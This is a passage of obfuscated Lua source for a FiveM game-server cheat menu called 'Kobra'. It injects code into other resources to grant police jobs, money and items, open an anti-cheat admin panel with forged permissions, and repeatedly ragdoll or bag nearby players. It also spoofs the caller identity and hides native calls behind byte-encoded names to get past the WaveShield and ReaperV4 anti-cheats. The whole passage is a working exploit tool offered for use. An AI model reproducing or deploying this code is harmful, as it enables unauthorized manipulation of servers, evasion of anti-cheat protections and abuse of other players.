                ]]);end});end if ((GetResourceState("es_extended")=="started") or (GetResourceState("core")=="started")) then v97({type="button",label="POLICE JOB (1)",onSelect=function() if (GetResourceState("es_extended")=="started") then local v817=0;while true do if (v817==(0 -0)) then v12:Notify("Setjob","Kobra","Your job has been set to police",3000);MachoInjectResource2(NewThreadNs,"es_extended",[[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]]);break;end end elseif (GetResourceState("core")=="started") then v12:Notify("Setjob","Kobra","Your job has been set to police",2192 + 808 );MachoInjectResource2(NewThreadNs,"core",[[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]]);else print("Neither core nor es_extended started");end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="POLICE JOB (2)",onSelect=function() local v671=0 + 0 ;while true do if ((0 -0)==v671) then v12:Notify("Setjob","Kobra","You are now Police",4244 -(334 + 910) );MachoInjectResourceRaw("any",[[
                    local lp = LocalPlayer
                    if lp and lp.state then
                        lp.state:set("job", {
                            name = "police",
                            label = "Police",
                            grade = 4,
                            grade_name = "sergeant"
                        }, true)
                        print("[✅] Job set to police successfully.")
                    else
                        print("[⚠️] Failed to set job: LocalPlayer or state not available.")
                    end
                ]]);break;end end end});end if (GetResourceState("codewave-sneaker-phone")=="started") then v97({type="button",label="COLLECT REWARDS",onSelect=function() MachoInjectResource2(NewThreadNs,"codewave-sneaker-phone",[[
                    function HookNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end
                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    HookNative("TriggerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    HookNative("TriggerServerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    _G.Kobra = {
                        TEvent = function(eName, ...)
                            return TriggerEvent(eName, ...)
                        end,
                        TSEvent = function(eName, ...)
                            return TriggerServerEvent(eName, ...)
                        end,
                    }

                    _G.Kobra.TSEvent('delivery:giveRewardShoes', 100000)
                    print("[✅] reward triggered successfully.")
                ]]);end});end if (GetResourceState("rzrp-base")=="started") then v97({type="checkbox",label="Ragdoll Players (RZRP)",checked=false,onSelect=function(v672) if v672 then local v818=895 -(92 + 803) ;while true do if (0==v818) then v12:Notify("Ragdoll","Kobra","Ragdolling Nearby Players",2204 + 1796 );v48("rzrp-base",[[
                        if not _G.KobraRagdollPlayersInitialized then
                            _G.KobraRagdollPlayersEnabled = true
                            _G.KobraRagdollPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            -- Stop any existing ragdoll thread before creating a new one
                            if _G.KobraRagdollThread then
                                TerminateThread(_G.KobraRagdollThread)
                                _G.KobraRagdollThread = nil
                            end

                            _G.KobraRagdollThread = SafeThread(function()
                                while _G.KobraRagdollPlayersEnabled and _G.KobraRagdollPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 30000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:Slap', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.KobraRagdollThread = nil
                            end)
                        else
                            _G.KobraRagdollPlayersEnabled = true
                        end
                    ]]);break;end end else local v819=1181 -(1035 + 146) ;while true do if (v819==0) then v12:Notify("Ragdoll","Kobra","Stopped Ragdolling Players",4616 -(230 + 386) );v48("rzrp-base",[[
                        _G.KobraRagdollPlayersEnabled = false
                        _G.KobraRagdollPlayersInitialized = false
                        if _G.KobraRagdollThread then
                            TerminateThread(_G.KobraRagdollThread)
                            _G.KobraRagdollThread = nil
                        end
                    ]]);break;end end end end});end if (GetResourceState("rzrp-base")=="started") then v97({type="checkbox",label="Bag Closest Players (RZRP)",checked=false,onSelect=function(v673) if v673 then local v820=0 + 0 ;while true do if (v820==0) then print("Bag Closest Players Started...");v48("rzrp-base",[[
                        if not _G.KobraBagPlayersInitialized then
                            _G.KobraBagPlayersEnabled = true
                            _G.KobraBagPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            if _G.KobraBagThread then
                                TerminateThread(_G.KobraBagThread)
                                _G.KobraBagThread = nil
                            end

                            _G.KobraBagThread = SafeThread(function()
                                while _G.KobraBagPlayersEnabled and _G.KobraBagPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 300000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:BagClosestPlayer', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.KobraBagThread = nil
                            end)
                        else
                            _G.KobraBagPlayersEnabled = true
                        end
                    ]]);break;end end else print("Bag Closest Players Stopped...");v48("rzrp-base",[[
                        _G.KobraBagPlayersEnabled = false
                        _G.KobraBagPlayersInitialized = false
                        if _G.KobraBagThread then
                            TerminateThread(_G.KobraBagThread)
                            _G.KobraBagThread = nil
                        end
                    ]]);end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="Force Gang",onSelect=function() local v674=0;local v675;local v676;local v677;local v678;while true do if (v674==(1512 -(353 + 1157))) then v678=string.format([[
                    LocalPlayer.state:set("gang", "%s", true)
                    LocalPlayer.state:set("gang_rank", %d, true)
                ]],v675,v676);v48(v677,v678);v12:ShowUI();v12:Notify("success","Kobra","Gang Set",5114 -(53 + 1061) );break;end if (0==v674) then v675="";v676=1636 -(1568 + 67) ;v12:HideUI();v60("Gang Name","",function(v902) if (v902 and (v902~="")) then v675=v902;end end,"typeable");v674=1 + 0 ;end if (v674==(1 + 0)) then Wait(5822 -3522 );v60("Gang Rank","",function(v903) if (v903 and (v903~="")) then v676=tonumber(v903) or 1 ;end end,"typeable");Wait(2942 -1942 );v677=((GetResourceState("scripts")=="started") and "scripts") or "framework" ;v674=2;end end end});end if (GetResourceState("framework")=="started") then v97({type="button",label="Give Item #2",onSelect=function() v12:HideUI();local function v679(v737,v738) local v739=nil;local v740=false;v60(v737,v738 or "" ,function(v821) v739=v821;v740=true;end,"typeable");while  not v740 do Wait(0 -0 );end return v739;end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item input...");local v680=v679("Item Name","");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw itemName =",tostring(v680));if ( not v680 or (v680=="")) then print("^7[^5Kobra^7] [^1ERROR^7]: Invalid or empty itemName");v12:Notify("error","Kobra","No item name entered",2831 + 169 );v12:ShowUI();return;end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item count input...");local v681=v679("Item Count","1");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw inputCount =",tostring(v681));local v682=tonumber(v681);if ( not v682 or (v682<1)) then print("^7[^5Kobra^7] [^1WARN^7]: Invalid count, defaulting to 1");v682=1213 -(615 + 597) ;end if (v682>(89469 + 10531)) then local v822=0 -0 ;while true do if (0==v822) then print("^7[^5Kobra^7] [^1WARN^7]: That shit too high, stamping to 100000");v682=82226 + 17774 ;break;end end end v680=tostring(v680 or "" );v682=tonumber(v682 or (1 + 0) );print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemName =",v680);print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemCount =",v682);local v683,v684=pcall(function() MachoInjectResourceRaw("framework",string.format([[
                        TriggerServerEvent('drugs:receive', {
                            Reward = {
                                Name = "%s",
                                Amount = %d
                            }
                        })
                    ]],v680,v682));end);if  not v683 then local v823=0 + 0 ;while true do if (v823==(1899 -(1056 + 843))) then print("^7[^5Kobra^7] [^1ERROR^7]: string.format failed →",v684);v12:Notify("error","Kobra","String format failed — check console",8722 -4722 );break;end end else print("^7[^5Kobra^7] [^2INFO^7]: Injection completed successfully");v12:Notify("success","Kobra","Item Sent",6654 -2654 );end v12:ShowUI();end});end if (GetResourceState("WayTooCerti_3D_Printer")=="started") then v97({type="button",label="COLLECT ITEMS 3",onSelect=function() MachoInjectResourceRaw("WayTooCerti_3D_Printer",[[
                local function Ak47Spawn()
                TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', 'money', 10000)
                end
                Ak47Spawn()
            ]]);end});end if (GetResourceState("tm-base")=="started") then table.insert(events,{name="Spawn Money #4",eventName="give_metro_money_04",execute=function() print("Give Money Metro RP...");MachoInjectResource2(NewThreadNs,"tm-base",[[
                TriggerServerEvent('tm-moneywash:giveCleanMoney', 100000)
                ]]);end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="Set Chat Tag",onSelect=function() local v685=0;local v686;local v687;local v688;local v689;while true do if (v685==0) then v12:HideUI();v686=nil;function v686(v904,v905) local v906=0 -0 ;local v907;local v908;while true do if (v906==(0 + 0)) then v907=nil;v908=false;v906=1977 -(286 + 1690) ;end if (v906==(913 -(98 + 813))) then return v907;end if (v906==(1 + 0)) then v60(v904,v905 or "" ,function(v1106) v907=v1106;v908=true;end,"typeable");while  not v908 do Wait(0 -0 );end v906=2;end end end v687=v686("Chat Tag Name","");v685=1;end if (v685==(1 + 0)) then if ( not v687 or (v687=="")) then v12:ShowUI();return;end Wait(1007 -(263 + 244) );v688=v686("Tag Color (R, G, B)","0, 255, 0");if ( not v688 or (v688=="")) then v688="255, 255, 255";end v685=2 + 0 ;end if (v685==(1689 -(1502 + 185))) then Wait(96 + 404 );v689=((GetResourceState("scripts")=="started") and "scripts") or "framework" ;MachoInjectResourceRaw(v689,string.format([[
                    LocalPlayer.state:set('currentChatTag', { tag = "%s", color = "%s" }, true)
                ]],v687,v688));v12:ShowUI();break;end end end});end if (GetResourceState("wasabi_multijob")=="started") then v97({type="button",label="POLICE JOB (3)",onSelect=function() local v690=0 -0 ;while true do if ((0 -0)==v690) then MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
            CheckJob(job, true) 
        ]]);MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            SelectJobMenu({ job = 'police', grade = 1, label = 'Police', boss = true, onDuty = false })
        ]]);break;end end end});end if (GetResourceState("wasabi_multijob")=="started") then v97({type="button",label="EMS JOB (1)",onSelect=function() local v691=1527 -(629 + 898) ;while true do if (v691==(0 -0)) then MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic", boss = false, onDuty = true }
            CheckJob(job, true)
        ]]);MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            SelectJobMenu({ job = 'ambulance', grade = 5, label = 'Ambulance', boss = true, onDuty = false })
        ]]);break;end end end});end if (GetResourceState("ElectronAC")=="started") then v97({type="button",label="ElectronAC Admin Panel",onSelect=function() MachoInjectResourceRaw("ElectronAC",[[
        SetNuiFocus(true, true)
        SendNUIMessage({
            action = "menu",
            data = {
                info = {
                    adminContext = {
                        master = true,
                        permissions = { "all" }
                    },
                    identifiers = {
                        ["ip"] = "127.0.0.1",
                        ["license"] = "",
                        ["license2"] = "",
                    },
                    permissions = {
                        adminMenu = true,
                        whitelisted = true
                    }
                },
                open = true,
                setOpen = true
            }
        })
        ]]);end});end if (GetResourceState("spoodyFraud")=="started") then v97({type="button",label="Collect Cash",onSelect=function() MachoInjectResource2(NewThreadNs,"spoodyFraud",[[
        function HookNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then
                return
            end

            _G[nativeName] = function(...)
                return newFunction(originalNative, ...)
            end
        end

        HookNative("CreateThread", function(originalFn, ...)
            return originalFn(...)
        end)

        HookNative("TriggerServerEvent", function(originalFn, ...)
            return originalFn(...)
        end)

        function Spoody()
            for i = 1, 30 do
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Swapped Sim Card')
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Cloned Card')

                Citizen.Wait(5)

                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Pacific Bank', 'clone')
                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Sandy Shoes', 'sim')
            end
        end

        CreateThread(function()
            Spoody()
        end)
        ]]);end});end v60("Choose Menu Key","",function(v508) for v598,v599 in pairs(v44) do if (v599:lower()==v508:lower()) then v23=v599;Wait(642 -392 );v12:ShowUI();return;end end end,"keybind");local v286=0;local v287=485 -(12 + 353) ;while true do Wait(0);if v32 then local v692=v38[v39];if IsControlJustReleased(0,14) then local v824=0;while true do if (v824==0) then v39=(v39% #v38) + 1 ;MachoSendDuiMessage(v14,json.encode({action="scroll",direction="down"}));break;end end end if IsControlJustReleased(0,1926 -(1680 + 231) ) then v39=((v39-(1 + 1))% #v38) + 1 + 0 ;MachoSendDuiMessage(v14,json.encode({action="scroll",direction="up"}));end if (v692=="Shoot Weapon") then local v825=1149 -(212 + 937) ;while true do if (v825==(0 + 0)) then if IsDisabledControlJustPressed(1062 -(111 + 951) ,9 + 35 ) then local v1085=0;while true do if (v1085==(27 -(18 + 9))) then v34=((v34-(1 + 1))% #v36) + (535 -(31 + 503)) ;MachoSendDuiMessage(v14,json.encode({action="updateWeapon",index=v34}));break;end end end if IsDisabledControlJustPressed(1632 -(595 + 1037) ,38) then v34=(v34% #v36) + (1445 -(189 + 1255)) ;MachoSendDuiMessage(v14,json.encode({action="updateWeapon",index=v34}));end break;end end elseif (v692=="Spawn Car") then if IsDisabledControlJustPressed(0 + 0 ,67 -23 ) then v35=((v35-(1281 -(1170 + 109)))% #v37) + (1818 -(348 + 1469)) ;MachoSendDuiMessage(v14,json.encode({action="updateVehicle",index=v35}));end if IsDisabledControlJustPressed(0,38) then local v1015=1289 -(1115 + 174) ;while true do if ((0 -0)==v1015) then v35=(v35% #v37) + (1015 -(85 + 929)) ;MachoSendDuiMessage(v14,json.encode({action="updateVehicle",index=v35}));break;end end end end if IsDisabledControlPressed(0 + 0 ,1891 -(1151 + 716) ) then local v826=v692;if (v826=="Shoot Weapon") then local v909=0 + 0 ;local v910;while true do if ((0 + 0)==v909) then v910=v36[v34];if (v910=="WEAPON_PERMKILL") then v910="WEAPON_TRANQUILIZER";elseif (v910=="WEAPON_RPG_2") then v910="WEAPON_AIRSTRIKE_ROCKET";end v909=1705 -(95 + 1609) ;end if (v909==(3 -2)) then if (v910~=v33) then v33=v910;print(("weapon: %s, LastWeaponFired: %s"):format(v910,v33));if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local function v1473(v1496) local v1497=0;local v1498;local v1499;local v1500;while true do if (v1497==1) then v1500=math.abs(math.cos(v1499));return vector3( -math.sin(v1498) * v1500 ,math.cos(v1498) * v1500 ,math.sin(v1499));end if ((758 -(364 + 394))==v1497) then v1498=math.rad(v1496.z);v1499=math.rad(v1496.x);v1497=1 + 0 ;end end end function hNative(v1501,v1502) local v1503=_G[v1501];if ( not v1503 or (type(v1503)~="function")) then return;end _G[v1501]=function(...) return v1502(v1503,...);end;end hNative("CreateThread",function(v1504,...) return v1504(...);end);hNative("Wait",function(v1505,...) return v1505(...);end);hNative("PlayerPedId",function(v1506,...) return v1506(...);end);hNative("GetHashKey",function(v1507,...) return v1507(...);end);hNative("GiveWeaponToPed",function(v1508,...) return v1508(...);end);hNative("SetCurrentPedWeapon",function(v1509,...) return v1509(...);end);hNative("GetCurrentPedWeapon",function(v1510,...) return v1510(...);end);hNative("RemoveWeaponFromPed",function(v1511,...) return;end);hNative("ShootSingleBulletBetweenCoords",function(v1512,...) return v1512(...);end);local v1474=GetCamCoord(_G.KobraFreecamObject);local v1475=GetCamRot(_G.KobraFreecamObject,1 + 1 );local v1476=v1473(v1475);local v1477=1000;local v1478=v1474 + (v1476 * v1477) ;local v1479=PlayerPedId();local v1480=GetHashKey(v910);local function v1481(v1513) local v1514=0;local v1515;while true do if (v1514==0) then v1515={};for v1645=1, #v1513 do v1515[v1645]=string.byte(v1513,v1645);end v1514=1;end if ((1 + 0)==v1514) then return table.concat(v1515,",");end end end local v1482=v1481(v910);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]],v1479,v1482));Wait(285 + 65 );ShootSingleBulletBetweenCoords(v1474.x,v1474.y,v1474.z,v1478.x,v1478.y,v1478.z,51 + 49 ,true,v1480,PlayerPedId(),true,false,100000);end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                    if _G.KobraFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                        local camRot = GetCamRot(_G.KobraFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]]   .. v910   .. [[")

                                        GiveWeaponToPed(PlayerPedId(), weaponHash, 13500, false, true)
                                        SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]] );end elseif _G.KobraFreecamObject then local function v1363(v1388) local v1389=0 + 0 ;local v1390;local v1391;local v1392;while true do if (v1389==(0 + 0)) then v1390=math.rad(v1388.z);v1391=math.rad(v1388.x);v1389=1 + 0 ;end if (v1389==1) then v1392=math.abs(math.cos(v1391));return vector3( -math.sin(v1390) * v1392 ,math.cos(v1390) * v1392 ,math.sin(v1391));end end end function hNative(v1393,v1394) local v1395=0 + 0 ;local v1396;while true do if (v1395==1) then _G[v1393]=function(...) return v1394(v1396,...);end;break;end if ((956 -(719 + 237))==v1395) then v1396=_G[v1393];if ( not v1396 or (type(v1396)~="function")) then return;end v1395=1;end end end hNative("CreateThread",function(v1397,...) return v1397(...);end);hNative("Wait",function(v1398,...) return v1398(...);end);hNative("PlayerPedId",function(v1399,...) return v1399(...);end);hNative("GetHashKey",function(v1400,...) return v1400(...);end);hNative("GiveWeaponToPed",function(v1401,...) return v1401(...);end);hNative("SetCurrentPedWeapon",function(v1402,...) return v1402(...);end);hNative("GetCurrentPedWeapon",function(v1403,...) return v1403(...);end);hNative("RemoveWeaponFromPed",function(v1404,...) return;end);local v1364=GetCamCoord(_G.KobraFreecamObject);local v1365=GetCamRot(_G.KobraFreecamObject,5 -3 );local v1366=v1363(v1365);local v1367=826 + 174 ;local v1368=v1364 + (v1366 * v1367) ;local v1369=PlayerPedId();local v1370=GetHashKey(v910);GiveWeaponToPed(v1369,v1370,631 -376 ,false,true);MachoInjectThread(0 -0 ,"ReaperV4","",[[
                                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:" .. ]]   .. v1370   .. [[, true, true)
                                    if success then
                                        print("Updated Cache Successfully")
                                    else
                                        print("Failed to Update Cache")
                                    end
                                ]] );Wait(250);ShootSingleBulletBetweenCoords(v1364.x,v1364.y,v1364.z,v1368.x,v1368.y,v1368.z,100,true,v1370,v1369,true,false,100000);end elseif ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local v1483=0;local v1484;local v1485;local v1486;local v1487;local v1488;local v1489;local v1490;local v1491;local v1492;local v1493;while true do if (v1483==(7 -4)) then hNative("ShootSingleBulletBetweenCoords",function(v1617,...) return v1617(...);end);v1485=GetCamCoord(_G.KobraFreecamObject);v1486=GetCamRot(_G.KobraFreecamObject,1993 -(761 + 1230) );v1487=v1484(v1486);v1483=197 -(80 + 113) ;end if (v1483==(2 + 0)) then hNative("GiveWeaponToPed",function(v1618,...) return v1618(...);end);hNative("SetCurrentPedWeapon",function(v1619,...) return v1619(...);end);hNative("GetCurrentPedWeapon",function(v1620,...) return v1620(...);end);hNative("RemoveWeaponFromPed",function(v1621,...) return;end);v1483=3 + 0 ;end if (v1483==5) then v1492=nil;function v1492(v1622) local v1623=0 + 0 ;local v1624;while true do if (v1623==0) then v1624={};for v1664=3 -2 , #v1622 do v1624[v1664]=string.byte(v1622,v1664);end v1623=1 + 0 ;end if (v1623==(1 + 0)) then return table.concat(v1624,",");end end end v1493=v1492(v910);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
